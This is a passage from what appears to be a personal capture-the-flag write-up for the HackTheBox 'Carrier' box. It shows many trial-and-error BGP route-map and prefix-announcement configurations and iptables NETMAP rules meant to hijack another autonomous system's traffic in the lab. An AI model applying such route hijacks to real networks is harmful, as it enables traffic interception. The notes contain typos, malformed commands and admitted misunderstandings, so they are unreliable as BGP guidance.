+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+wr
+router bgp 100
+network 10.120.15.10
+
+</code></pre>
+
+<p>as200 is problably configured with bgp bestpath as-path ignore whichs will force it to go to the sportest path presented to it. If it not on the system it would install 10.120.0.0 from as 300 i believe maybe. I&rsquo;d also like to note that i might have been using the metric atribute wrong. it goes from 200 to 0 0 being default and 1 being preferred over 200.</p>
+
+<p>So if i set the metric for to-as300 to 200 it would be the last route, because the default path is 0 which would make as100 lowest would make my path preferred.</p>
+
+<p>while not applicable router compares metrics in the same AS first before other AS that might give those higher path preference.</p>
+
+<p>i dont think i need to add bpg always-compare-med to my commands because it needs to be configured on to-as200. to accept the changes in the first places</p>
+
+<p>default-metric to set local metrics</p>
+
+<pre><code>router bgp 100
+network 10.120.0.0
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+
+route-map to-as300 permit 10
+match as-path 1
+set metric 200
+wr
+ip as-path access-list 1 permit ^300$
+</code></pre>
+
+<p>trying to uses the other</p>
+
+<pre><code>router bgp 100
+network 10.120.0.0
+neighbor 10.78.11.2 route-map to-as100 in
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+
+route-map to-as300 permit 10
+match as-path 1
+set metric 200
+wr
+ip as-path access-list 1 permit ^300$
+</code></pre>
+
+<p>trying to aggregate the address</p>
+
+<pre><code>router bgp 100
+network 10.78.0.0
+aggredate-address 10.120.0.0 255.255.0.0
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+
+route-map to-as300 permit 10
+match as-path 1
+set metric 200
+wr
+ip as-path access-list 1 permit ^300$
+</code></pre>
+
+<pre><code>router bgp 100
+aggregate-address 10.120.0.0 255.255.0.0
+neighbor 10.78.10.2 route-map to-as200 in
+
+route-map to-as200 permit 20
+
+route-map to-as300 permit 10
+match as-path 1
+set metric 200
+wr
+ip as-path access-list 1 permit ^300$
+
+</code></pre>
+
+<p>the former seems to cluttered to be the answer.</p>
+
+<pre><code>router bgp 100
+aggregate-address 10.120.15.0 255.255.0.0
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+
+route-map to-as300 permit 10
+set metric 200
+exit
+wr
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>this time use the aggregate attribute-map</p>
+
+<p>you need need to add network 10.120.0.0 so that as100 annouces it has the route to as300. arg</p>
+
+<pre><code>aggregate-address 160.0.0.0 255.0.0.0 attribute-map SETORIGIN
+</code></pre>
+
+<pre><code>conf t
+clear ip bgp
+router bgp 100
+default-metric 100
+network 10.120.0.0
+aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300
+neighbor 10.78.10.1 route-map to-as200 in
+neighbor 10.78.10.2 route-map to-as200 out
+neighbor 10.78.11.1 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 out
+
+route-map to-as200 permit 20
+match as-path 1
+set weight 100
+route-map to-as300 permit 10
+match as-path 2
+set metric 200
+
+exit
+wr
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<pre><code>clear ip bgp *
+conf t
+router bgp 100
+network 10.120.15.0
+
+aggregate-address 10.120.15.0 255.255.255.0
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.10.2 route-map to-as200 out
+neighbor 10.78.11.2 remote-as 200
+neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 out
+
+route-map to-as200 permit 20
+match as-path 1
+route-map to-as300 permit 10
+set metric 200
+exit
+
+
+ip as-path access-list 1 permit .*
+ip as-path access-list 2 permit .*
+wr 
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<pre><code>clear ip bgp *
+conf t
+router bgp 100
+network 10.120.15.0
+
+aggregate-address 10.120.15.0 255.255.255.0
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.11.2 remote-as 300
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 out
+
+route-map to-as200 permit 20
+match as-path 1
+route-map to-as300 permit 20
+match as-path 2
+set metric 200
+exit
+
+ip as-path access-list 1 permit .*
+ip as-path access-list 2 permit .*
+wr 
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>id like to take a moment to review what sh ip bgp is outputting</p>
+
+<p>to get to 300 i go to 200 then 300, i dont want this</p>
+
+<p><img src="analyzzeee.PNG" alt="analyzzeee" /></p>
+
+<p>this is almost what i want to get to 200 i got to 300 then 200</p>
+
+<p>on 10.78.10.2 there are no hopes which is what i believe i want.</p>
+
+<p>for me to get too 20 i have to go 300 to 200. I want to keep 10.78.11.2 chan</p>
+
+<p>im not sure the original bgpd.conf only allows one path to get to as300. when i make my changes  i have multiple paths which while i made my changes it could still allow the default path.</p>
+
+<p><img src="analyzzeee2.PNG" alt="analyzzeee2" /></p>
+
+<p>&ldquo;You can use the set as-path prepend command in order to prepend path numbers to your updates and make the path length look longer. But, with attributes such as local preference, metric, or weight, AS400 can have set the exit point to be AS200. In this case, there is nothing that you can do. &ldquo;</p>
+
+<pre><code>clear ip bgp *
+conf t
+router bgp 100
+network 10.120.15.0
+
+aggregate-address 10.120.15.0 255.255.255.0
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.11.2 remote-as 300
+neighbor 10.78.10.2 route-map to-as200 out
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+match as-path 1
+set metric 200
+route-map to-as300 permit 10
+match as-path 2
+set metric 100
+exit
+
+ip as-path access-list 1 permit .*
+ip as-path access-list 2 permit .*
+wr 
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>change permit attribute to-as200 to 10 it could take up to ten ssecond for a update to occur in this enviroment.</p>
+
+<p>network 10.120.15.0/24</p>
+
+<p><img src="analyzzeee4.PNG" alt="analyzzeee4" /></p>
+
+<pre><code>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2
+
+conf t
+router bgp 100
+network 10.0.0.0
+
+aggregate-address 10.0.0.0 255.255.255.0
+
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.11.2 remote-as 300
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 out
+
+route-map to-as200 permit 20
+match as-path 1
+set metric 130
+exit
+route-map to-as300 permit 20
+match as-path 1
+set metric 150
+
+ip as-path access-list 1 permit ^200$
+ip as-path access-list 1 deny ^300$
+wr 
+end
+sh ip bgp
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<pre><code>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2
+
+conf t
+router bgp 100
+network 10.120.15.0/24
+
+route-map to-as200 permit 20
+match as-path 1
+set metric 110
+exit
+route-map to-as300 permit 10
+match as-path 2
+set metric 120
+
+ip as-path access-list 1 deny ^300$
+ip as-path access-list 2 deny ^200$
+wr 
+end
+wr
+
+
+sh ip bgp
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p><img src="analyzzeee5.PNG" alt="analyzzeee5" /></p>
+
+<pre><code>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2
+
+conf t
+router bgp 100
+no synchronization
+bgp always-compare-med 
+network 10.120.15.0/24
+
+aggregate-address 10.120.0.0 255.255.0.0 summary-only
+bgp default local-preference 100
+
+route-map to-as200 permit 10
+set metric 50
+
+route-map to-as300 permit 10
+set metric 160
+
+wr 
+end
+wr
+wr
+wr
+
+
+
+sh ip bgp
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>Route-map 10, 20 references a set of conditions. When the first set of conditions 10 aren&rsquo;t met it moves to the next highest set of conditions.</p>
+
+<p>after you clear ip bgp it still leaves route-map elements.</p>
+
+<p>in this attempt well through out all preconcived notions.</p>
+
+<pre><code>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2
+clear ip bgp *
+
+conf t
+router bgp 100
+default-metric 100
+neighbor 10.78.10.2 route-map to-as200 out
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 10
+match as-path 1
+set metric 2
+route-map to-as300 permit 10
+match as-path 2
+set metric 5
+
+ip as-path access-list 1 permit ^200$
+ip as-path access-list 2 permit ^300$
+end
+wr
+
+
+sh ip bgp
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<pre><code>sudo iptables -t nat -F
+sudo iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.6.1.2
+sudo iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP --to 10.1.1.2
+</code></pre>
+
+<pre><code>
+</code></pre>
+
+<p>in this image</p>
+
+<p>10.78.10.2 connects to 200 on 10.78.11.2 connects via 300 to 200</p>
+
+<p>10.78.11.2 connects to 300 on 10.78.10.2 connects via 200 to 300</p>
+
+<p><img src="analyzzeee6.PNG" alt="analyzzeee6" /></p>
+
+<p><img src="analyzzeee-map.png" alt="analyzzeee-map" /></p>
+
+<h4 id="failed">FAILED</h4>
+
+<p>this attempt will be slightly different than the others i will clear the route tables first. then completely reconfigure the routers configuration. i will attempt to use the final solution at the end of the cisco case study guide.  i reassigned the interfaces, im telling the router . in the exampled i followed they used no synchron which isn&rsquo;t nessisary because that effects ibgp stuff in the same AS. defined the neighbors because i deleted the current configuration. which may have been why my changes didn&rsquo;t work.</p>
+
+<p>unknown commands it might be becauses its for ospf lol</p>
+
+<pre><code>clear ip bgp
+
+ip subnet-zero
+interface Loopback0
+ip address 10.99.64.2 255.255.255.0
+interface eth1
+ip address 10.78.10.2 255.255.255.0
+interface eth2
+ip address 10.78.11.2 255.255.255.0
+
+router bgp 100
+network 10.120.0.0
+aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.10.2 route-map to-as200 out
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 remote-as 300
+neighbor 10.78.10.2 route-map to-as300 out
+neighbor 10.78.11.2 route-map to-as300 in
+exit
+ip classless
+ip default-network 10.120.15.0
+ip as-pth access-list 1 permit ^300$
+
+route-map to-as200 permit 20
+match as-path 1
+set local-preference 300
+
+route-map to-as200 permit 10
+match as-path 2
+set metric 200
+exit
+wr
+
+cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>neighbor 10.78.10.2 route-map to-as200 in</p>
+
+<p>neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>route-map to-as200 permit 20</p>
+
+<p>match</p>
+
+<p>route-map to-as300 permit 10
+match as-path 1
+set weight 1</p>
+
+<p>example 2</p>
+
+<p>ip as-path access-list 1 permit ^200$</p>
+
+<p>ip as-path access-list 2 permit ^300$</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>neighbor 10.120.15.1 route-map to-as300 out</p>
+
+<p>match ip address</p>
+
+<p>access-list 1 deny 10.120.0.0 0.0.255.255</p>
+
+<p>access-list 1 permit 0.0.0.0 255.255.255.255</p>
+
+<p>route-map to-ass300 permit 20</p>
+
+<p>network 10.120.15.0</p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/blue/" title="Blue"> <i class="fa fa-chevron-left"></i><label>Blue</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper" style="margin-right: 0px;"><label>CrimeStopper</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/carrier.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
